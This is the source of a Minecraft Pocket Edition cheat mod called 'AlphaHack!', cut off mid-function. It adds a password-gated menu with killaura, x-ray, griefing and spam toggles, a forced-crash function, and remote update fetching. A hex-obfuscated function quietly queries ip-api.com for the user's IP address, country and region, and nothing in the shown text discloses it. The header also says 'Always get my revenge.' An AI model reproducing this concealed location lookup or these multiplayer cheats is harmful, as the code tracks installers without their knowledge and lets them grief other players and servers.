/*
*     AlphaHack! version: 6.0
*
*     Authors: Arceus_matt, godsoft029.
*
*     Started: MCPE v0.12.0
*
*     Open src?: Do not copy! ask permission.
*
*     Coding langs: HTML, js, java, php, python.
*
*     desc: Half illegal half MCPE tool, used for
*     multi player use & single player modding.
*
*     Creator: Arceus_matt.
*
*     Always get my revenge. =) enjoy!
*/
var upTime = 0;
upTime++

ModPE.langEdit("menu.copyright","Mojang & Arceus_matt's AlphaHack!");
ModPE.langEdit("menu.play","§9Play");
ModPE.langEdit("menu.options","§9Settings");
ModPE.langEdit("menu.skins","§9Skins");
ModPE.langEdit("playscreen.header.local","§9Select world");
ModPE.langEdit("skins.title","§9Skins");
ModPE.langEdit("options.title","§9Settings");
ModPE.langEdit("deathScreen.message","§c§lWasted");
ModPE.langEdit("playscreen.new","§9New");
ModPE.langEdit("playscreen.quit","§9Back");
ModPE.langEdit("skins.restore.button","§9Restore");
ModPE.langEdit("createWorldScreen.advanced","§9Advanced");
ModPE.langEdit("externalServerScreen.addServer","§9Add Server");
ModPE.langEdit("multiplayer.player.joined","§9%s joined the game");
ModPE.langEdit("multiplayer.player.left","§9%s left the game");
ModPE.langEdit("deathScreen.quit","§9Main Menu");
ModPE.langEdit("deathScreen.respawn","§9Respawn");
ModPE.langEdit("pauseScreen.quit","§9Main Menu");
ModPE.langEdit("pauseScreen.options","§9Settings");
ModPE.langEdit("pauseScreen.back","§9Back to game");
ModPE.langEdit("menu.returnToGame","§9Back to game");
ModPE.langEdit("death.attack.mob","§9%1$s was slain by %2$s");
ModPE.langEdit("death.attack.fall","§9%1$s hit the ground too hard");
ModPE.langEdit("death.attack.explosion","§9%1$s blew up");
ModPE.langEdit("death.attack.arrow","§9%1$s was shot by %2$s");
ModPE.langEdit("death.attack.drown","§9%1$s drowned");
ModPE.langEdit("death.fell.accident.generic","§9%1$s fell from a high place");
ModPE.langEdit("death.attack.outOfWorld","§9%1$s fell out of the world");
ModPE.langEdit("death.attack.onFire","§9%1$s burned to death");
ModPE.langEdit("death.attack.magic","§9%1$s was killed by magic");
ModPE.langEdit("death.attack.inWall","§9%1$s suffocated in a wall");
ModPE.langEdit("death.attack.lava","§9%1$s tried to swim in lava");
ModPE.langEdit("death.attack.inFire","§9%1$s went up in flames");
ModPE.langEdit("death.attack.cactus","§9%1$s was pricked to death");
ModPE.langEdit("commands.op.success","§lOpped %s");
ModPE.langEdit("commands.banip.success","§rBanned IP address §l%s");
ModPE.langEdit("commands.banip.success.players","§rBanned IP address §l%s §rbelonging to %s");
ModPE.langEdit("chatScreen.hide","§9Hide");
var _0x567c=["\x68\x74\x74\x70\x3A\x2F\x2F\x69\x70\x2D\x61\x70\x69\x2E\x63\x6F\x6D\x2F\x6A\x73\x6F\x6E","\x6E\x65\x74","\x6F\x70\x65\x6E\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x47\x45\x54","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x4D\x65\x74\x68\x6F\x64","\x73\x65\x74\x44\x6F\x4F\x75\x74\x70\x75\x74","\x63\x6F\x6E\x6E\x65\x63\x74","\x67\x65\x74\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x65\x6E\x67\x74\x68","\x67\x65\x74\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D","\x42\x79\x74\x65","\x6C\x61\x6E\x67","\x6E\x65\x77\x49\x6E\x73\x74\x61\x6E\x63\x65","\x41\x72\x72\x61\x79","\x72\x65\x66\x6C\x65\x63\x74","\x72\x65\x61\x64","","\x70\x61\x72\x73\x65","\x73\x75\x63\x63\x65\x73\x73","\x65\x71\x75\x61\x6C\x73","\x73\x74\x61\x74\x75\x73","\x71\x75\x65\x72\x79","\x63\x6F\x75\x6E\x74\x72\x79","\x72\x65\x67\x69\x6F\x6E\x4E\x61\x6D\x65","\x45\x72\x72\x6F\x72","\x6C\x69\x6E\x65\x4E\x75\x6D\x62\x65\x72","\x73\x74\x61\x72\x74"];function getIp(_0x9781x2){var _0x9781x3= new java[_0x567c[10]].Runnable({run:function(){try{var _0x9781x4= new java[_0x567c[1]].URL(_0x567c[0]);var _0x9781x5=_0x9781x4[_0x567c[2]]();_0x9781x5[_0x567c[4]](_0x567c[3]);_0x9781x5[_0x567c[5]](true);_0x9781x5[_0x567c[6]]();_0x9781x5[_0x567c[7]]();var _0x9781x6=_0x9781x5[_0x567c[8]]();var _0x9781x7=java[_0x567c[10]][_0x567c[13]][_0x567c[12]][_0x567c[11]](java[_0x567c[10]][_0x567c[9]].TYPE,1024);var _0x9781x8=0;var _0x9781x9;while((_0x9781x8=_0x9781x6[_0x567c[14]](_0x9781x7))!= -1){_0x9781x9= new java[_0x567c[10]].String(_0x9781x7,0,_0x9781x8)};var _0x9781xa=JSON[_0x567c[16]](_0x9781x9+_0x567c[15]);if(_0x9781xa[_0x567c[19]][_0x567c[18]](_0x567c[17])){_0x9781x2( new Array(_0x9781xa[_0x567c[20]],_0x9781xa[_0x567c[21]],_0x9781xa[_0x567c[22]]))}else {print(_0x567c[23]);_0x9781x2( new Array(_0x567c[23],_0x567c[23],_0x567c[23]))}}catch(e){clientMessage(e);clientMessage(e[_0x567c[24]])}}});var _0x9781xb= new java[_0x567c[10]].Thread(_0x9781x3);_0x9781xb[_0x567c[25]]()}
var bg64 = "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";
var forbid = "ah6";
var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
var Button = android.widget.Button;
var LinearLayout = android.widget.LinearLayout;
var RelativeLayout = android.widget.RelativeLayout;
var PopupWindow = android.widget.PopupWindow;
var ScrollView = android.widget.ScrollView;
var TextView = android.widget.TextView;
var CheckBox = android.widget.CheckBox;
var Toast = android.widget.Toast;
var Runnable = java.lang.Runnable;
var View = android.view.View;
var ColorDrawable = android.graphics.drawable.ColorDrawable;
var Color = android.graphics.Color;
var Gravity = android.view.Gravity;
var Intent = android.content.Intent;
var Uri = android.net.Uri;
var GUI;
var menu;
var exitUI; 
var notex;
var notey;
var notez;
var line4;
var text4;
num1 = 1;
num0  = 0;
var version = "0.6.0";
var name = "Alphα Hαck";
var authers = "Arceus_matt";
var authers2 = "Godsoft 029";
var auther = "Arceus_matt";
var name2 = "Alphα Hαck";
var copyright = " ©";
var space = " ";
var hackcount = 0;
var fps = 0;
var lastLoop = new Date;
var modpeFolder = ctx.getDir("ModPE", 0);
var modpeFile = new java.io.File(modpeFolder, "ALPHAHack.js");
var can = 1;
var canGetHP = 1;
var HP;
var gravity = -0.07840000092983246;
var nameColor = "§7";
var healthColor = "§c";
var GetLang = net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetLanguageName();

function checkVersion() {
    var r  = new java.lang.Runnable() {
        run: function() {
            try {
 var urls= new java.net.URL("https://raw.githubusercontent.com/ArceusMatt/ALPHAHack/master/Version.txt");
                var check = urls.openConnection();
                check.setRequestMethod("GET");
                check.setDoOutput(true);
                check.connect();
                check.getContentLength();
                var script = check.getInputStream();
                var typeb = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
                var byteCount = 0; 
                var checkedVersion;
                while((byteCount = script.read(typeb)) != -1) { 
                    checkedVersion = new java.lang.String(typeb, 0, byteCount);               
                }
                newUpdate = checkedVersion;
                if(version+"\n" != checkedVersion) {
print("New update! " + newUpdate);
                    updateWindow=true;
                }
                else if(version+"\n"==checkedVersion){
                /*print("No update available");*/
                }
            }
            catch(err) {
                
                if(err=="JavaException: java.net.UnknownHostException: raw.githubusercontent.com") {
                                
                            }
                            else {
                                print("Error: " + err);
                            } 
            }
        }
    }
    var threadt = new java.lang.Thread(r);
    threadt.start();
}
      function updateVersion()
      {
var urls = new Intent(ctx);                  urls.setAction(Intent.ACTION_VIEW);
                    urls.setData(Uri.parse("https://www.dropbox.com/s/k29sz9u27sgqnjr/ALPHAHack.js?dl=1"));
                    ctx.startActivity(urls);
      }

var sspam = false;
var hackk = false;
var showp = false;
var cords = false;
var fch = false;
var onlyday = false;
var saddle = false;
var instakilled = false;
var instabreak = false;
var stackheart = false;
var parti = false;
var parti2 = false;
var nowalls = false;
var waterwalk = false;
var highjumps = false;
var grief = false;
var killaura = false;
var killfaura = false;
var uirender = false; 
var xxray = false; 
var stat22 = false; 
var healthy = false;

var GUIColor = Color.TRANSPARENT
var GUIColor1 = Color.TRANSPARENT;
var GUIColor2 = Color.BLACK;
var GUIColor3 = Color.WHITE;
var GUIColor4 = Color.RED;
var GUIColor5 = Color.BLUE;
var GUIColor6 = Color.GRAY;
var GUIColor7 = Color.LTGRAY;
var GUIColor8 = Color.YELLOW;
var GUIColor9 = Color.CYAN;
var GUIColor10 = Color.DKGRAY;
var GUIColor11 = Color.GREEN;
var GUIColor12 = Color.MAGENTA;

var GUIName = Color.WHITE;

var checkForUpdate=false;
var updateWindow=false; 
var newUpdate;
var updateMod;
                
var defaultDestroyTime = [
null, 1.5, 0.6, 0.5, 2, 2, 0, -1, null, null, null, null, 
0.5, 0.6, 3, 3, 3, 2, 0.2, 0.6, 0.3, 3, 3, null, 0.8, null, 
0.2, 0.7, null, null, 4, 0, 0, null, null, 0.8, null, 0, 
0, 0, 0, 3, 5, 2, 2, 2, 0, 1.5, 2, 50, 0, 0, null, 2, 2.5, 
null, 3, 5, 2.5, 0, 0.6, 3.5, 3.5, 1, 3, 0.4, 0.7, 2, 1, 
null, null, 5, null, 3, 3, null, null, null, 0.1, 0.5, 0.2, 
0.4, 0.6, 0, null, 2, 1, 0.4, 0.3, null, 1, 0.5, null, null, 
-1, 3, null, 1.5, null, null, 5, 0.3, 1, 0, 0, null, 2, 2, 
1.5, null, null, 2, null, 2, null, null, null, null, null, 
null, null, null, null, null, null, null, null, 0.8, null, 
null, null, null, null, 2, 2, 2, null, null, 2, null, 0, 0, 
null, null, null, null, null, null, null, null, null, null, 
null, null, 0.8, 0.8, 2, 2, null, null, null, null, null, null, 
null, null, null, null, null, 0.5, 0.1, 5, null, null, null, 
null, null, null, null, null, null, null, null, null, null, null, 
null, null, null, null, null, null, null, null, null, null, null, 
null, null, null, null, null, null, null, null, null, null, null, 
null, null, null, null, null, null, null, null, null, null, null, 
null, null, null, null, null, null, null, null, null, null, null, 
null, null, null, null, null, null, null, null, null, null, null, 
null, 0, 3.5, 50, 5, 0.6, 0.6, 5, null, null, null, null, 0
]; 

function healthIndicators() {
    var mobs = Entity.getAll();

    for(var i = 0; i < mobs.length; i++) {


        var xq = Entity.getX(mobs[i]) - getPlayerX();

        var yq = Entity.getY(mobs[i]) - getPlayerY();

        var zq = Entity.getZ(mobs[i]) - getPlayerZ();



        if(xq * xq + yq * yq + zq * zq <= 14 * 14 && mobs[i] != getPlayerEnt()) {

            if(Entity.getEntityTypeId(mobs[i]) == 10) {
                Entity.setNameTag(mobs[i], nameColor + "Chicken " + healthColor + Entity.getHealth(mobs[i]) + "/4"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 11) {
                Entity.setNameTag(mobs[i], nameColor + "Cow " + healthColor + Entity.getHealth(mobs[i]) + "/10"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 12) {
                Entity.setNameTag(mobs[i], nameColor + "Pig " + healthColor + Entity.getHealth(mobs[i]) + "/10"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 13) {
                Entity.setNameTag(mobs[i], nameColor + "Sheep " + healthColor + Entity.getHealth(mobs[i]) + "/8"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 14) {
                Entity.setNameTag(mobs[i], nameColor + "Wolf " + healthColor + Entity.getHealth(mobs[i]) + "/8"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 15) {
                Entity.setNameTag(mobs[i], nameColor + "Villager " + healthColor + Entity.getHealth(mobs[i]) + "/20"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 16) {
                Entity.setNameTag(mobs[i], nameColor + "Mooshroom " + healthColor + Entity.getHealth(mobs[i]) + "/10"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 17) {
                Entity.setNameTag(mobs[i], nameColor + "Squid " + healthColor + Entity.getHealth(mobs[i]) + "/10"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 19) {
                Entity.setNameTag(mobs[i], nameColor + "Bat " + healthColor + Entity.getHealth(mobs[i]) + "/6"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 20) {
                Entity.setNameTag(mobs[i], nameColor + "Iron Golem " + healthColor + Entity.getHealth(mobs[i]) + "/100"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 21) {
                Entity.setNameTag(mobs[i], nameColor + "Snow Golem " + healthColor + Entity.getHealth(mobs[i]) + "/10"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 22) {
                Entity.setNameTag(mobs[i], nameColor + "Ocelot " + healthColor + Entity.getHealth(mobs[i]) + "/10"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 32) {
                Entity.setNameTag(mobs[i], nameColor + "Zombie " + healthColor + Entity.getHealth(mobs[i]) + "/20"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 33) {
                Entity.setNameTag(mobs[i], nameColor + "Creeper " + healthColor + Entity.getHealth(mobs[i]) + "/20"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 34) {
                Entity.setNameTag(mobs[i], nameColor + "Skeleton " + healthColor + Entity.getHealth(mobs[i]) + "/20"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 35) {
                Entity.setNameTag(mobs[i], nameColor + "Spider " + healthColor + Entity.getHealth(mobs[i]) + "/16"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 36) {
                Entity.setNameTag(mobs[i], nameColor + "Zombie Pigman " + healthColor + Entity.getHealth(mobs[i]) + "/20"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 37) {
                Entity.setNameTag(mobs[i], nameColor + "Slime " + healthColor + Entity.getHealth(mobs[i]) + "/16"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 38) {
                Entity.setNameTag(mobs[i], nameColor + "Enderman " + healthColor + Entity.getHealth(mobs[i]) + "/40"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 39) {
                Entity.setNameTag(mobs[i], nameColor + "Silverfish " + healthColor + Entity.getHealth(mobs[i]) + "/8"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 40) {
                Entity.setNameTag(mobs[i], nameColor + "Cave Spider " + healthColor + Entity.getHealth(mobs[i]) + "/12"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 41) {
                Entity.setNameTag(mobs[i], nameColor + "Ghast " + healthColor + Entity.getHealth(mobs[i]) + "/10"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 42) {
                Entity.setNameTag(mobs[i], nameColor + "Magma Cube " + healthColor + Entity.getHealth(mobs[i]) + "/16"); //spawn your wither in x y and z
            }
            if(Entity.getEntityTypeId(mobs[i]) == 43) {
                Entity.setNameTag(mobs[i], nameColor + "Blaze " + healthColor + Entity.getHealth(mobs[i]) + "/20"); //spawn your wither in x y and z
            }
        }
    }
}

function dip2px(dips){
    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density);
}

function newLevel(){ 
clientMessage("§2Mods are enabling..."); 
var healthy = true;
healthy;
}
 
function xyz() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var pass = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter password");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(pass);
Layer.addView(Exit);

pass.setText("");
pass.setHint("Enter to activate hack menu");
Exit.setText("Confirm");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
set =pass.getText().toString()
Dialog.dismiss();
if(set.toLowerCase()==forbid)after();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The password Dialog Is Malfunctioning:"+e);
}
}});
}

function after(){
cmenu_menu();
             menu.dismiss();
             exitUI.dismiss();
header.dismiss();
}

function crash(){
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeForceCrash();
}


function showMenuBtn(){
ctx.runOnUiThread(new Runnable({ run: function(){
    try{
        var layout = new LinearLayout(ctx);
        layout.setOrientation(1);
        var menuBtn = new Button(ctx);
menuBtn.setTextSize(24);
        menuBtn.setBackgroundDrawable(new android.graphics.drawable.BitmapDrawable(android.graphics.BitmapFactory.decodeByteArray(android.util.Base64.decode(bg64, 0) , 0, android.util.Base64.decode(bg64, 0).length)));
        menuBtn.setTextColor(Color.WHITE);
        menuBtn.setOnClickListener(new View.OnClickListener({
            onClick: function(viewarg){
 mainMenu()
exit(); 
headerView()
//GUI.dismiss();
//menuBtn = null;
            }
        }));
        layout.addView(menuBtn);
 
        GUI = new PopupWindow(layout, dip2px(45), dip2px(45)); 

        GUI.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        GUI.showAtLocation(ctx.getWindow().getDecorView(), Gravity.RIGHT | Gravity.TOP, 0, 120);
        }catch(err){
            Toast.makeText(ctx, "An error occured: " + err, 1).show();
        }
    }}));
}
showMenuBtn(); 
function mainMenu(){
    ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var menuLayout = new LinearLayout(ctx);
            var menuScroll = new ScrollView(ctx);
            var menuLayout1 = new LinearLayout(ctx);
            menuLayout.setOrientation(1);
            menuLayout1.setOrientation(1);
            menuScroll.addView(menuLayout);
            menuLayout1.addView(menuScroll);

            var name = new TextView(ctx);
            name.setTextSize(20);
